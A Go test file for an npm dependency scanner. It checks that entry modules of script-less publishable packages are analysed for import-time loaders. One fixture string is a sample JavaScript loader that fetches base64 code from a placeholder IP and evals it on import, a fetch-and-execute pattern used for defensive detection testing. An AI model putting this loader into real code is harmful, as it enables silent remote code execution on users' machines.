package npm_test

import (
	"encoding/json"
	"os"
	"path/filepath"
	"testing"

	"ihbv.io/depsnort/internal/ecosystem/npm"
	"ihbv.io/depsnort/internal/graph"
)

// D-134: OPU-38's publishable-root pass bailed out with `if len(m.Scripts) == 0
// { continue }` BEFORE reaching its own load-time (entry-module) analysis. A
// published package with no lifecycle scripts at all, whose entry module runs a
// loader the instant a consumer imports it, was therefore invisible when scanned
// as its own root — reinstating, for publishable roots, exactly the RedC2
// evasion that OPU-31 added load-time analysis to catch. The main
// (lockfile-resolved) loop never had this bug: it guards the script pass with
// `if len(m.Scripts) > 0` and then runs the entry-candidate loop unconditionally.

// d134Root builds a publishable root package whose package.json optionally
// carries lifecycle scripts and/or "private": true, plus an entry module.
func d134Root(t *testing.T, withScripts, private bool, entryFile, entrySrc string) string {
	t.Helper()
	dir := t.TempDir()
	man := map[string]any{
		"name":    "d134-pkg",
		"version": "1.0.0",
		"main":    entryFile,
	}
	if withScripts {
		man["scripts"] = map[string]string{"test": "echo ok"}
	}
	if private {
		man["private"] = true
	}
	b, err := json.Marshal(man)
	if err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dir, "package.json"), b, 0o644); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dir, entryFile), []byte(entrySrc), 0o644); err != nil {
		t.Fatal(err)
	}
	return dir
}

// d134Hooks runs ExtractInstallSurface over a root node shaped like the
// no-lockfile path (registered root, no npm.path) and returns the names of the
// hook nodes attributed to it.
func d134Hooks(t *testing.T, dir string) []string {
	t.Helper()
	g := graph.New()
	rootID := "pkg:npm/d134-pkg@1.0.0"
	g.AddNode(&graph.Node{
		ID:        rootID,
		Kind:      graph.KindPackage,
		Ecosystem: "npm",
		Name:      "d134-pkg",
		Version:   "1.0.0",
		Depth:     0,
		Attr:      map[string]string{"npm.source": "package.json"}, // no npm.path
	})
	g.MarkRoot(rootID)
	if err := (&npm.Adapter{}).ExtractInstallSurface(dir, g); err != nil {
		t.Fatalf("ExtractInstallSurface: %v", err)
	}
	var out []string
	for _, n := range g.SortedNodes() {
		if n.Kind == graph.KindInstallHook && n.Attr["hook.package"] == rootID {
			out = append(out, n.Name)
		}
	}
	return out
}

// d134LoaderJS is the RedC2 shape: fetch remote content and eval it, at import
// time, with no lifecycle script involved. C2 is an inert RFC 5737 placeholder.
const d134LoaderJS = `const https = require('https');
https.get('https://203.0.113.77/stage2', r => {
  let b = ''; r.on('data', d => b += d);
  r.on('end', () => eval(Buffer.from(b, 'base64').toString()));
});`

// d134BenignJS is an ordinary library entry module: no exec signal, no network.
const d134BenignJS = `'use strict';
function add(a, b) { return a + b; }
module.exports = { add };`

// TestD134ScriptsLessPublishableRootEntryModuleAnalyzed is the regression this
// fix exists for: with NO lifecycle scripts, the loader entry module must still
// be analyzed. Before the fix this returned no hooks at all.
func TestD134ScriptsLessPublishableRootEntryModuleAnalyzed(t *testing.T) {
	hooks := d134Hooks(t, d134Root(t, false /* no scripts */, false, "index.js", d134LoaderJS))
	if len(hooks) == 0 {
		t.Fatal("expected a load-time hook for a scripts-less publishable root with a loader entry module, found none")
	}
	found := false
	for _, h := range hooks {
		if h == "module-load:index.js" {
			found = true
		}
	}
	if !found {
		t.Errorf("expected hook \"module-load:index.js\", got %v", hooks)
	}
}

// TestD134ScriptsPresentStillAnalyzed pins the pre-existing behaviour that the
// fix must not disturb: the same package WITH scripts was already analyzed.
// Paired with the test above, it isolates the bug to the scripts-count guard —
// these two fixtures differ only by a harmless "test": "echo ok" entry.
func TestD134ScriptsPresentStillAnalyzed(t *testing.T) {
	hooks := d134Hooks(t, d134Root(t, true /* scripts */, false, "index.js", d134LoaderJS))
	if len(hooks) == 0 {
		t.Error("expected a load-time hook when lifecycle scripts are present")
	}
}

// TestD134BenignScriptsLessRootProducesNoHook is the FP boundary: removing the
// scripts guard must not start flagging ordinary scripts-less libraries. The
// load-time pass is still gated on a JS-precise execution signal, so a plain
// module scores nothing.
func TestD134BenignScriptsLessRootProducesNoHook(t *testing.T) {
	hooks := d134Hooks(t, d134Root(t, false, false, "index.js", d134BenignJS))
	if len(hooks) != 0 {
		t.Errorf("did not expect any hook for an ordinary scripts-less library entry module, got %v", hooks)
	}
}

// TestD134PrivateScriptsLessRootStillExcluded confirms the "private": true
// guard still dominates on the path the fix opened up: an application root is
// not consumer-facing, so its entry module stays unscored even with no scripts.
func TestD134PrivateScriptsLessRootStillExcluded(t *testing.T) {
	hooks := d134Hooks(t, d134Root(t, false, true /* private */, "index.js", d134LoaderJS))
	if len(hooks) != 0 {
		t.Errorf("did not expect any hook for a private (application) root, got %v", hooks)
	}
}
